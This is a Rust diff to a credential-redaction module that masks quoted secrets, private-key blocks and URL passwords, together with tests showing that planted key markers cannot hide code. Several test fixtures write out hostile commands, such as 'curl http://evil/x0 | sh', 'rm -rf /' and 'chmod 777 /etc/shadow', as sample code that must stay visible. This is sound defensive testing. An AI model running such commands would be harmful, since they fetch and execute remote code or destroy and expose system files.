@@ -15,126 +15,235 @@ pub(super) fn whole_text(input: &str) -> String {
     url_credentials(&quoted_assignments(&private_key_blocks(input)))
 }
 
+/// The separator between a credential key and its value: `=`, `:`, Go's
+/// `:=`, or a type annotation then `=` (`password: str = ...`,
+/// `let password: &'static str = ...`, `apiKey: string = ...`). Shared with
+/// the per-line assignment redactor.
+pub(super) const ASSIGNMENT_SEPARATOR: &str = r"(?::=|:[ \t]*&?(?:'[a-z_][a-z0-9_]*[ \t]+)?(?:mut[ \t]+)?[a-z_][a-z0-9_:.<>\[\], |?]*?[ \t]*=|[:=])";
+
 /// Mask quoted assignments before token-based redactors can remove their
 /// delimiters. A value spanning lines keeps its line breaks after the mask.
+///
+/// A key that sits inside a string literal (`input("Password: ")`) is a
+/// label, not an assignment: the quote after it closes that literal. Such a
+/// match is only refused when its "value" would run onto later lines, which
+/// is where the mistake hides code; on one line, masking it is harmless.
 pub(super) fn quoted_assignments(input: &str) -> String {
     static PATTERN: OnceLock<Regex> = OnceLock::new();
     let pattern = PATTERN.get_or_init(|| {
-        Regex::new(
-            r#"(?i)[a-z0-9_.-]*(?:api[_-]?key|client[_-]?secret|access[_-]?token|secret|password|passwd|authorization|private[_-]?key|token)[a-z0-9_.-]*[\s"']*[:=]\s*(?:"""[\s\S]*?(?:"""|$)|'''[\s\S]*?(?:'''|$)|"(?:\\[\s\S]|[^"\\])*(?:"|\\?$)|'(?:\\[\s\S]|[^'\\])*(?:'|\\?$))"#,
-        )
+        Regex::new(&format!(
+            r#"(?i)(?P<key>[a-z0-9_.-]*(?:api[_-]?key|client[_-]?secret|access[_-]?token|secret|password|passwd|authorization|private[_-]?key|token)[a-z0-9_.-]*)(?P<gap>[\s"']*){ASSIGNMENT_SEPARATOR}\s*(?:"""[\s\S]*?(?:"""|$)|'''[\s\S]*?(?:'''|$)|"(?:\\[\s\S]|[^"\\])*(?:"|\\?$)|'(?:\\[\s\S]|[^'\\])*(?:'|\\?$)|`(?:\\[\s\S]|[^`\\])*(?:`|\\?$))"#,
+        ))
         .expect("fixed quoted credential assignment pattern")
     });
-    pattern
-        .replace_all(input, |captures: &regex::Captures<'_>| {
-            let mut mask = String::from("[REDACTED]");
-            for (index, _) in captures[0].match_indices('\n') {
-                let crlf = captures[0][..index].ends_with('\r');
-                mask.push_str(if crlf { "\r\n" } else { "\n" });
-            }
-            mask
-        })
-        .into_owned()
+    let mut out = String::with_capacity(input.len());
+    let mut copied = 0;
+    let mut from = 0;
+    while let Some(captures) = pattern.captures_at(input, from) {
+        let (Some(whole), Some(key)) = (captures.get(0), captures.name("key")) else {
+            break;
+        };
+        let line_start = input[..key.start()].rfind('\n').map_or(0, |at| at + 1);
+        let inside_literal = open_quote(&input[line_start..key.start()])
+            .is_some_and(|quote| !captures["gap"].contains(quote));
+        if inside_literal && whole.as_str().contains('\n') {
+            // Retry after the key, so a real assignment the bogus match
+            // would have swallowed is still found.
+            from = key.end();
+            continue;
+        }
+        out.push_str(&input[copied..whole.start()]);
+        out.push_str("[REDACTED]");
+        for (index, _) in whole.as_str().match_indices('\n') {
+            let crlf = whole.as_str()[..index].ends_with('\r');
+            out.push_str(if crlf { "\r\n" } else { "\n" });
+        }
+        copied = whole.end();
+        from = whole.end();
+    }
+    out.push_str(&input[copied..]);
+    out
 }
 
-/// Replace every line from a `BEGIN ... PRIVATE KEY` marker through its `END`
-/// marker. Line count and terminators are preserved so line-addressed reads
-/// of the masked text still line up with the source.
+/// The quote character of a string literal still open at the end of
+/// `prefix`, if any.
+fn open_quote(prefix: &str) -> Option<char> {
+    let mut open = None;
+    let mut escaped = false;
+    for ch in prefix.chars() {
+        match open {
+            Some(_) if escaped => escaped = false,
+            Some(_) if ch == '\\' => escaped = true,
+            Some(quote) if ch == quote => open = None,
+            Some(_) => {}
+            None if matches!(ch, '"' | '\'' | '`') => open = Some(ch),
+            None => {}
+        }
+    }
+    open
+}
+
+/// Mask private key material. Line count and terminators are preserved so
+/// line-addressed reads of the masked text still line up with the source.
 ///
-/// Inside a block (or a PuTTY body) a line that is wholly key material
-/// (base64, an armor header, blank) is replaced. A line that only contains
-/// key material, such as `pem += "MIIE...";`, keeps the block open and has
-/// each base64 run masked in place, so the code around it stays readable.
-/// Any other line ends the block: a planted marker cannot hide later code.
+/// Only key text is replaced, never a whole line of code:
+/// - an armor marker (`-----BEGIN ... PRIVATE KEY-----`) is replaced in
+///   place, and key-like base64 between markers on the same line is masked,
+///   so code sharing a line with a marker stays visible;
+/// - inside a block (or a PuTTY body) a body line is replaced only when it
+///   is one unbroken base64 token, or nothing but quoted base64 string
+///   fragments, of at least [`KEY_LINE_MIN`] characters (or any length right
+///   before the closing marker, where the short final line sits);
+/// - a line that embeds key text in code (`pem += "MIIE...";`) keeps the
+///   block open and has only those base64 runs masked;
+/// - any other line ends the block.
+///
+/// Code with words separated by spaces (`rm -rf /`, `x = y + 1`) is never a
+/// body line, so a planted or unterminated marker cannot hide it.
 pub(super) fn private_key_blocks(input: &str) -> String {
-    static MARKER: OnceLock<Regex> = OnceLock::new();
-    let marker = MARKER.get_or_init(|| {
-        // PEM and OpenSSH use five dashes, SSH2 four and spaces. The key type
-        // between the words is free text (`X-ED25519`, tabs), but bounded so
-        // prose that merely says "begin ... private key" is not armor.
-        Regex::new(r"(?i)-{3,}\s*(BEGIN|END)\b[^\r\n]{0,40}?PRIVATE\s+KEY")
-            .expect("fixed private key marker pattern")
-    });
     static PUTTY: OnceLock<Regex> = OnceLock::new();
     let putty = PUTTY.get_or_init(|| {
         Regex::new(r"(?i)\bPrivate-Lines:\s*(\d+)").expect("fixed PuTTY key pattern")
     });
+    let marker = armor_marker();
+    let lines: Vec<&str> = input.split_inclusive('\n').collect();
+    // Whether a line's first armor marker is an END marker.
+    let closes = |line: &str| {
+        marker
+            .captures(line)
+            .is_some_and(|captures| captures[1].eq_ignore_ascii_case("END"))
+    };
     let mut out = String::with_capacity(input.len());
     let mut in_block = false;
     // PuTTY keys have no armor: `Private-Lines: N` precedes N body lines.
     let mut putty_lines = 0usize;
-    for line in input.split_inclusive('\n') {
+    for (index, line) in lines.iter().enumerate() {
         let content = line.trim_end_matches(['\n', '\r']);
+        let ending = &line[content.len()..];
         // Every line updates both trackers, masked or not, so one format's
         // body can never hide the other's opening marker.
-        let last = marker
-            .captures_iter(content)
-            .last()
-            .map(|captures| captures[1].eq_ignore_ascii_case("BEGIN"));
         let putty_header = putty
             .captures(content)
             .map(|count| count[1].parse().unwrap_or(usize::MAX));
         let inside = in_block || putty_lines > 0;
-        let whole =
-            last.is_some() || putty_header.is_some() || (inside && key_material_line(content));
-        let partial = inside
-            && !whole
-            && base64_run()
-                .find_iter(content)
-                .any(|run| key_like(run.as_str()));
-        if inside && !whole && !partial {
-            in_block = false;
-            putty_lines = 0;
-        }
-        if whole {
+        let final_line =
+            (in_block && lines.get(index + 1).is_some_and(|next| closes(next))) || putty_lines == 1;
+        if marker.is_match(content) {
+            // Each segment is masked according to whether it lies inside a
+            // block; the markers themselves are always replaced.
+            let mut open = in_block;
+            let mut copied = 0;
+            for captures in marker.captures_iter(content) {
+                let Some(found) = captures.get(0) else {
+                    continue;
+                };
+                let segment = &content[copied..found.start()];
+                out.push_str(&if open {
+                    mask_key_runs(segment, 4)
+                } else {
+                    segment.to_string()
+                });
+                out.push_str(PRIVATE_KEY_MARKER);
+                open = captures[1].eq_ignore_ascii_case("BEGIN");
+                copied = found.end();
+            }
+            let tail = &content[copied..];
+            out.push_str(&if open {
+                mask_key_runs(tail, 4)
+            } else {
+                tail.to_string()
+            });
+            out.push_str(ending);
+            in_block = open;
+        } else if inside && key_material_line(content, final_line) {
             out.push_str(PRIVATE_KEY_MARKER);
-            out.push_str(&line[content.len()..]);
-        } else if partial {
-            out.push_str(
-                &base64_run().replace_all(content, |run: &regex::Captures<'_>| {
-                    if key_like(&run[0]) {
-                        PRIVATE_KEY_MARKER.to_string()
-                    } else {
-                        run[0].to_string()
-                    }
-                }),
-            );
-            out.push_str(&line[content.len()..]);
+            out.push_str(ending);
+        } else if inside && has_key_run(content, final_line) {
+            out.push_str(&mask_key_runs(content, key_run_min(final_line)));
+            out.push_str(ending);
         } else {
+            if inside {
+                in_block = false;
+                putty_lines = 0;
+            }
             out.push_str(line);
         }
         putty_lines = putty_lines.saturating_sub(1);
         if let Some(count) = putty_header {
             putty_lines = putty_lines.max(count);
         }
-        // The last armor marker on a line decides, so a one-line key (escaped
-        // newlines in a string) opens and closes here.
-        if let Some(opens) = last {
-            in_block = opens;
-        }
     }
     out
 }
 
-/// A run long enough to be a fragment of a key body.
+/// `-----BEGIN RSA PRIVATE KEY-----`, `---- END SSH2 ENCRYPTED PRIVATE KEY
+/// ----`, `-----BEGIN PGP PRIVATE KEY BLOCK-----`. PEM and OpenSSH use five
+/// dashes, SSH2 four and spaces. The key type between the words is free text
+/// (`X-ED25519`, tabs), but bounded so prose that merely says "begin ...
+/// private key" is not armor.
+fn armor_marker() -> &'static Regex {
+    static MARKER: OnceLock<Regex> = OnceLock::new();
+    MARKER.get_or_init(|| {
+        Regex::new(r"(?i)-{3,}\s*(BEGIN|END)\b[^\r\n]{0,40}?PRIVATE\s+KEY(?:\s+BLOCK)?[ \t]*-*")
+            .expect("fixed private key marker pattern")
+    })
+}
+
+/// Shortest body line taken as key text on its own. PEM and PuTTY bodies
+/// wrap at 64 characters, OpenSSH at 70 and SSH2 at up to 72; only the last
+/// line is shorter, and that one is recognised by the closing marker after it.
+const KEY_LINE_MIN: usize = 40;
+
+fn key_run_min(final_line: bool) -> usize {
+    if final_line {
+        4
+    } else {
+        KEY_LINE_MIN
+    }
+}
+
 fn base64_run() -> &'static Regex {
     static RUN: OnceLock<Regex> = OnceLock::new();
-    RUN.get_or_init(|| Regex::new(r"[A-Za-z0-9+/]{16,}={0,2}").expect("fixed base64 run pattern"))
+    RUN.get_or_init(|| Regex::new(r"[A-Za-z0-9+/]{4,}={0,2}").expect("fixed base64 run pattern"))
+}
+
+fn has_key_run(text: &str, final_line: bool) -> bool {
+    let min = key_run_min(final_line);
+    base64_run()
+        .find_iter(text)
+        .any(|run| run.len() >= min && key_like(run.as_str()))
+}
+
+/// Replace the key-like base64 runs of at least `min` characters.
+fn mask_key_runs(text: &str, min: usize) -> String {
+    base64_run()
+        .replace_all(text, |run: &regex::Captures<'_>| {
+            if run[0].len() >= min && key_like(&run[0]) {
+                PRIVATE_KEY_MARKER.to_string()
+            } else {
+                run[0].to_string()
+            }
+        })
+        .into_owned()
 }
 
 /// Base64 key text, not a word. A 64-character body line without a digit,
 /// `+`, `/` or `=` occurs about once in a million; identifiers and keywords
-/// (`import os`, `executeMaliciousPayload`) almost always lack them, so a
+/// (`import`, `executeMaliciousPayload`) almost always lack them, so a
 /// planted marker cannot pass ordinary code off as key material.
 fn key_like(text: &str) -> bool {
     text.bytes()
         .any(|byte| byte.is_ascii_digit() || matches!(byte, b'+' | b'/' | b'='))
 }
 
-/// A line that can belong to a key body: base64, also when quoted, escaped,
-/// concatenated or split into several string fragments on the line
-/// (`"MIIE" "abcd" +`); a PEM/PGP/SSH2 armor header; or blank.
-fn key_material_line(content: &str) -> bool {
+/// A line that can belong to a key body: a PEM/PGP/SSH2 armor header, a
+/// blank line, or key text written one of two ways:
+/// - one unbroken token, optionally quoted, escaped (`\n`, a trailing `\`)
+///   or followed by `,`, `;` or a concatenating `+`;
+/// - several complete quoted string fragments (`"MIIE" "abcd" +`).
+///
+/// Spaces inside unquoted text mean code, never key text.
+fn key_material_line(content: &str, final_line: bool) -> bool {
     static HEADER: OnceLock<Regex> = OnceLock::new();
     let header = HEADER.get_or_init(|| {
         Regex::new(
@@ -146,18 +255,39 @@ fn key_material_line(content: &str) -> bool {
     if header.is_match(trimmed.trim_start_matches(['"', '\'', '`'])) {
         return true;
     }
-    // String syntax anywhere on the line is not key text; what remains must
-    // be empty (blank or punctuation only) or base64 that looks like a key.
-    let text: String = trimmed
-        .replace("\\n", "")
-        .replace("\\r", "")
-        .chars()
-        .filter(|ch| !matches!(ch, '"' | '\'' | '`' | ' ' | '\t' | ',' | ';' | '\\'))
+    let core = trimmed
+        .trim_start_matches(|ch: char| ch == '+' || ch.is_whitespace())
+        .trim_end_matches(|ch: char| matches!(ch, ',' | ';' | '+' | '\\') || ch.is_whitespace());
+    let tokens: Vec<&str> = core
+        .split_whitespace()
+        .filter(|token| *token != "+")
         .collect();
-    text.is_empty()
-        || (text.bytes().all(|byte| {
+    let mut body = String::new();
+    for token in &tokens {
+        let inner = if tokens.len() == 1 {
+            token.trim_matches(['"', '\'', '`'])
+        } else {
+            let Some(inner) = quoted_fragment(token) else {
+                return false;
+            };
+            inner
+        };
+        body.push_str(&inner.replace("\\n", "").replace("\\r", ""));
+    }
+    body.is_empty()
+        || (body.bytes().all(|byte| {
             byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'=' | b'-' | b'_')
-        }) && key_like(&text))
+        }) && key_like(&body)
+            && body.len() >= key_run_min(final_line))
+}
+
+/// The text of a token that is one complete string literal.
+fn quoted_fragment(token: &str) -> Option<&str> {
+    let quote = token
+        .chars()
+        .next()
+        .filter(|ch| matches!(ch, '"' | '\'' | '`'))?;
+    (token.len() >= 2 && token.ends_with(quote)).then(|| &token[1..token.len() - 1])
 }
 
 /// Mask the password in `scheme://user:password@host` for any URL scheme:
@@ -176,7 +306,9 @@ fn key_material_line(content: &str) -> bool {
 pub(super) fn url_credentials(input: &str) -> String {
     static PATTERN: OnceLock<Regex> = OnceLock::new();
     let pattern = PATTERN.get_or_init(|| {
-        Regex::new(r"(?i)\b[a-z][a-z0-9+.-]*://[^\s/:@]*:").expect("fixed URL credential pattern")
+        // The username may hold an unencoded `@` (`alerts@corp.com`, as SMTP
+        // and Atlassian URLs carry it).
+        Regex::new(r"(?i)\b[a-z][a-z0-9+.-]*://[^\s/:?#]*:").expect("fixed URL credential pattern")
     });
     // Next `@` and next whitespace at or after a position, found once and
     // reused until the cursor passes them, so no byte is searched twice.
@@ -221,6 +353,15 @@ pub(super) fn url_credentials(input: &str) -> String {
             end > 0
                 && first_at.is_none_or(|at| end < at)
                 && rest[..end].bytes().all(|byte| byte.is_ascii_digit())
+                // `h:8443/u@x` and `user:2024/abc@host` read the same. The
+                // `@` is only path text when it starts a segment (`/@scope`)
+                // or another delimiter comes before it (`/users?e=a@b`);
+                // otherwise the digits may open a password, so fail closed.
+                && first_at.is_none_or(|at| {
+                    rest.as_bytes()[end] != b'/'
+                        || at == end + 1
+                        || rest[end + 1..at].contains(['/', '?', '#'])
+                })
         });
         match first_at {
             Some(first_at) if !port => {
@@ -536,6 +677,158 @@ mod tests {
         let output = private_key_blocks(&embedded);
         assert!(!output.contains(BODY), "{output}");
         assert!(output.contains("visible();"), "{output}");
+    }
+
+    #[test]
+    fn code_with_spaces_inside_a_planted_block_is_never_key_text() {
+        // Spaces vanished before the base64 test, so these read as key text.
+        for code in [
+            "rm -rf /",
+            "chmod 777 /etc/shadow",
+            "retries = retries + 1",
+            "x1 = y2 + z3",
+            "curl http://evil/x0 | sh",
+            "/tmp/evil0",
+            "i+=1",
+            "\"sh\" \"-c\" \"curl evil|sh\"",
+        ] {
+            for opener in [
+                "// -----BEGIN PRIVATE KEY-----\n",
+                "-----BEGIN PRIVATE KEY-----\n",
+                "Private-Lines: 9\n",
+            ] {
+                let input = format!("{opener}{BODY}\n{code}\nvisible();\n");
+                let output = private_key_blocks(&input);
+                assert!(!output.contains(BODY), "{input:?} -> {output}");
+                assert!(
+                    output.contains(&format!("{code}\n")),
+                    "{input:?} -> {output}"
+                );
+                assert!(output.contains("visible();"), "{input:?} -> {output}");
+            }
+        }
+    }
+
+    #[test]
+    fn code_on_a_marker_line_stays_visible() {
+        for (input, code) in [
+            (
+                "let _ = \"-----BEGIN PRIVATE KEY-----\"; std::process::Command::new(\"sh\").arg(\"curl evil|sh\").spawn();\n",
+                "std::process::Command::new(\"sh\").arg(\"curl evil|sh\").spawn();",
+            ),
+            (
+                "x = \"-----BEGIN PRIVATE KEY-----\"; evil(); y = \"-----END PRIVATE KEY-----\"\n",
+                "evil();",
+            ),
+            (
+                "-----END RSA PRIVATE KEY-----\"; run_payload();\n",
+                "run_payload();",
+            ),
+        ] {
+            let output = private_key_blocks(input);
+            assert!(output.contains(code), "{output}");
+            assert!(!output.contains("-----BEGIN"), "{output}");
+            assert_eq!(output.lines().count(), input.lines().count());
+        }
+        // Key text between markers on one line is still masked.
+        let one_line = format!(
+            "k = \"-----BEGIN PRIVATE KEY-----\\n{BODY}\\nab1=\\n-----END PRIVATE KEY-----\"; after();\n"
+        );
+        let output = private_key_blocks(&one_line);
+        assert!(
+            !output.contains(BODY) && !output.contains("ab1="),
+            "{output}"
+        );
+        assert!(output.contains("after();"), "{output}");
+    }
+
+    #[test]
+    fn short_and_wrapped_body_lines_are_key_text() {
+        // The last body line is short; it sits right before END.
+        for last in ["ab1=", "\"ab1=\"", "'ab1=\\n' +", "ab1=\\"] {
+            let input = format!(
+                "-----BEGIN PRIVATE KEY-----\n{BODY}\n{last}\n-----END PRIVATE KEY-----\nvisible();\n"
+            );
+            let output = private_key_blocks(&input);
+            assert!(!output.contains("ab1="), "{input:?} -> {output}");
+            assert!(output.contains("visible();"), "{output}");
+        }
+        // The last PuTTY body line is short too; its count marks it.
+        let putty = format!("Private-Lines: 2\n{BODY}\nab1=\nPrivate-MAC: x\n");
+        let output = private_key_blocks(&putty);
+        assert!(
+            !output.contains("ab1=") && !output.contains(BODY),
+            "{output}"
+        );
+        assert!(output.contains("Private-MAC: x"), "{output}");
+    }
+
+    #[test]
+    fn typed_go_and_backtick_assignments_are_masked_whole() {
+        for input in [
+            "password: str = \"fixture secret phrase\"",
+            "let password: &str = \"fixture secret phrase\";",
+            "let password: &'static str = \"fixture secret phrase\";",
+            "const apiKey: string = \"fixture secret phrase\";",
+            "private val token: String? = \"fixture secret phrase\"",
+            "password := \"fixture secret phrase\"",
+            "const apiKey = `fixture secret phrase`;",
+            "api_key = `fixture secret\nphrase`\n",
+        ] {
+            let output = quoted_assignments(input);
+            for part in ["fixture", "secret phrase", "phrase"] {
+                assert!(!output.contains(part), "{input:?} -> {output:?}");
+            }
+            assert_eq!(output.lines().count(), input.lines().count());
+        }
+        // Comparisons are not typed assignments.
+        for code in ["if password == \"x\" {", "password: x != \"y\""] {
+            assert_eq!(quoted_assignments(code), code);
+        }
+    }
+
+    #[test]
+    fn a_credential_word_inside_a_string_does_not_hide_later_lines() {
+        let input = "pw = input(\"Password: \")\nos.system(evil)\nname = \"x\"\n";
+        let output = whole_text(input);
+        assert!(output.contains("os.system(evil)"), "{output}");
+        assert!(output.contains("name = \"x\""), "{output}");
+        // A real assignment the bogus match would have swallowed is masked.
+        let input =
+            "print(\"enter token: \")\nrun(evil)\npassword = \"fixture first\nfixture second\"\n";
+        let output = whole_text(input);
+        assert!(output.contains("run(evil)"), "{output}");
+        assert!(!output.contains("fixture"), "{output}");
+        assert_eq!(output.lines().count(), input.lines().count());
+        // Quoted keys (JSON, YAML) are still keys.
+        let json = "{\"password\": \"fixture first\nfixture second\"}";
+        assert!(!whole_text(json).contains("fixture"));
+    }
+
+    #[test]
+    fn url_usernames_with_at_and_digit_led_passwords_are_masked() {
+        for (url, host) in [
+            (
+                "smtp://alerts@corp.com:Sup3r-sensitive@smtp.corp.com:587",
+                "@smtp.corp.com:587",
+            ),
+            (
+                "redis://default:2024/abc-sensitive@cache:6379",
+                "@cache:6379",
+            ),
+            ("postgres://u:5432/sensitive@db/app", "@db/app"),
+        ] {
+            let output = url_credentials(url);
+            assert!(!output.contains("sensitive"), "{url} -> {output}");
+            assert!(output.ends_with(host), "{url} -> {output}");
+        }
+        // A username with no password, and a port, stay visible.
+        for visible in [
+            "https://user@host:8443/path",
+            "ssh://git@github.com:22/org/repo",
+        ] {
+            assert_eq!(url_credentials(visible), visible);
+        }
     }
 
     #[test]
